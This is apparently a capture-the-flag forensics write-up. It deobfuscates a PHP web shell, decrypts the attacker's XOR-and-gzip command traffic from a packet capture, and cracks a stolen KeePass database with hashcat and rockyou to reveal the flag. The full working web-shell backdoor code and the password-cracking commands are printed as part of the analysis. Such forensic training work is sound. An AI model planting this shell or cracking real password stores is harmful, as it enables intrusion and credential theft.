
**Challenge Description**
An attacker has found a vulnerability in our web server that allows arbitrary [[PHP]] file upload in our [[Apache]] server. Suchlike, the hacker has uploaded a what seems to be like an obfuscated shell (support.php). We monitor our network 24/7 and generate logs from [[tcpdump]] (we provided the log file for the period of two minutes before we terminated the [[HTTP]] service for investigation), however, we need your help in analyzing and identifying commands the attacker wrote to understand what was compromised.


### My Solution

As mentioned we have an obfuscated [[PHP]] shell, so deobfuscation is obviously the first intended step.

**PHP code deobfescated**
```php
<?php
$N='create_function';
$u=str_replace('u)','',$V.$d.$P.$c.$B);
$x=$N('',$u);
$x();
?>


<?php

$k="80e32263";
$kh="6f8af44abea0";
$kf="351039f4a7b5";
$p="0UlYyJHG87EJqEz6";

function x($t,$k)
{
	$c=strlen($k); // strlen('80e32263') = 8
	$l=strlen($t); // UNKNOWN
	$o="";
	for($i = 0; $i < $l;)
	{
		// j < 8 AND i < l
		for ($j=0; ($j < $c && $i <$l); $j++, $i++)
		{
			// concatination of xor
			$o .= $t{$i} ^ $k{$j};
		}
	}
	return $o;
}

if (@preg_match("/$kh(.?)$kf/", @file_get_contents("php://input"), $m) == 1)
{
	@ob_start();
	@eval(
		@gzuncompress(
			@x(
				@base64_decode(
					$m[1]
				),
				$k
			)
		)
	);
	$o = @ob_get_contents();
	@ob_end_clean();
	$r = @base64_encode(
		@x(
			@gzcompress($o),
			$k
		)
	);
	print("$p $kh $r $kf");
}

?>
```

the shell receives commands when a request data matches the regex `/$kh(.?)$kf/` else it returns nothing.

`@ob_start()` function will turn output buffering on. While output buffering is active no output is sent from the script (other than headers), instead the output is stored in an internal buffer .
```php
ob_start(callabl $callback = null, int $chunk_size=0, int $flags=`PHP_OUTPUT_HANDLER_STDFLAGS`): bool
```



`@ob_get_content()` function will the contents of the output buffer without clearing it.
```php
ob_get_content(): string|false
```

then `ob_end_clean()` is used to clean the buffer for the next command.
```php
ob_end_clean(): bool
```

As a common detection evasion method it seems the attacker has ciphered the commands in transition to not be seen by [[firewalls]], so [[Cryptanalysis]] of ciphered would help decode the commands from the captured frames in the network [[pcap]] file.

**Cryptanalysis**
```php
<?php

// XOR stream cipher
function x($plain_text, $key)
{
	$key_len = strlen($key); 
	$text_len = strlen($plain_text);
	$cipher = "";
	for($i = 0; $i < $text_len;)
	{
		// j < 8 AND i < l
		for ($j = 0; ($j < $key_len && $i < $text_len); $j++, $i++)
		{
			// concate of xor
			$cipher .= $plain_text[$i] ^ $key[$j];
		}
	}
	return $cipher;
}


// the code provided by challenge simplified
// reconstructed to be understandable
function encrypt($value, $key="80e32263")
{
	// Confusion by post encryption compression
	$value = gzcompress($value);
	
	// Basic XOR encryption
	$value = x($value, $key);
	
	// Confusion by post encryption encoding
	$value = base64_encode($value);
	
	// Confusion by post encryptoin padding
    $value = "0UlYyJHG87EJqEz6" . "6f8af44abea0" . $value . "351039f4a7b5";
     
    return $value; 
}


// Reversing the encryption algorithm
function decrypt($cipher, $key="80e32263")
{
	// Removing post encryption padding
    $cipher = str_replace("0UlYyJHG87EJqEz6", "", $cipher);
    $cipher = str_replace("6f8af44abea0", "", $cipher); 
    $cipher = str_replace("351039f4a7b5", "", $cipher); 
    
    // Decoding
    $cipher = base64_decode($cipher);
    
    // Inverse of XOR is XOR
    $cipher = x($cipher, $key); 
    
    // Decompression
	$cipher = gzuncompress($cipher); 
	
    return $cipher; 
}

print( encrypt($value="Pretty much secret") );
print( decrypt("0UlYyJHG87EJqEz66f8af44abea0QKy2/Pr9e+Z3eUh4//sZexUyZR8mN/g=351039f4a7b5") );
?>
```

I have attempted to reverse the encryption in [[CyberChef]] but failed in the decompression as it decompresses gzip files, it seems to be doable as people claim the HTB discussions but I found that the best way to decipher something enciphered with a language is using the same language. 
![[Pasted image 20231003010029.png]]

obviously you can extract the commands output by getting the support.php responses which can be extracted automatically with [[wireshark]].

you find the bash `id` command output `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, which means the user `www-data` has been compromised.

followed by the output of an `ls` command in the directory, which indicates that the current directory is `/home/developer/` or the command was `ls /home/developer/`.
```
total 24K
drwxr-xr-x 2 developer developer 4.0K May 21 20:37 .
drwxr-xr-x 3 root      root      4.0K May 20 21:28 ..
-rw-r--r-- 1 developer developer  220 May 20 21:28 .bash_logout
-rw-r--r-- 1 developer developer 3.5K May 20 21:28 .bashrc
-rw-r--r-- 1 developer developer  675 May 20 21:28 .profile
-rw-r--r-- 1 developer developer 1.6K May 21 20:37 pwdb.kdbx
```

then the output of `pwd` command which is `/home/developer`.

Lastly a weird output that looks like a [[base64]] encoded text
```
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
```

when decode produces nothing comprehend-able to humans, I suspected it is a `cat pwdb.kdbx` since [[Keepass]] databases do contain password and that what hackers wants but had doubt. I thought maybe machines could understand it and it confirmed my suspicions.  
```bash
deadude@Ng00m4lDhuhr:~$ file pwdb.kdbx 
pwdb.kdbx: Keepass password database 2.x KDBX
```

A password is expected and a password was found when I used `kpcli --kdb pwdb.kdbx`.
[[brute-force]] attack was the obvious option using the [[Rockyou]] as usual but first we need the hash.

To extract the hash you would need `keepass2john.py` and that can be found written by [scottlinux](https://gist.github.com/scottlinux) [here](https://gist.github.com/scottlinux/f6cb8b1bb7807e89c09c139064f69881) .

run it with [[python3]] and you will get the following hash
```hash
$keepass$*2*6000*222*204c86ee9d2e89b4d5ff55ebe51c3cd4bf1a904ccea385ab892c9ce8400cc785*b7a535e876d76745024f20fc3e0d1db75d8fd72929de7bec30a565ef4a5ac6e6*118296757720a8d3ca11e1f170483802*5c6b99d0aab4a0957eb0f988b21818d37c31bb8111f83c0d8512556e4bfd1cc8*aa28fb2ca246bdb19dd3c8b2e8b2cd4f2d9630bac44a3ba26b3dbd13cded845b
```

I preferred [[hashcat]] over building [[John The Ripper]] from the repository. In few  with [[Rockyou]] which you can get from [kali wordlists package](https://gitlab.com/kalilinux/packages/wordlists/-/tree/kali/master?ref_type=heads), you should already have it if you are using [[kali-linux]] distro.
```bash
deadude@Ng00m4lDhuhr:~/Desktop/HackTheBox/Obscure/$hashcat -m 13400 hash /usr/share/wordlists/rockyou.txt
```

you should shortly find that the password is `chainsaw`, use it and you will find the flag in Password 0 entry along side the [backdoor source code git repo](https://github.com/epinna/weevely3).
<details>
<summary>Flag = HTB{....}</summary>
HTB{pr0tect_y0_shellZ}</details>

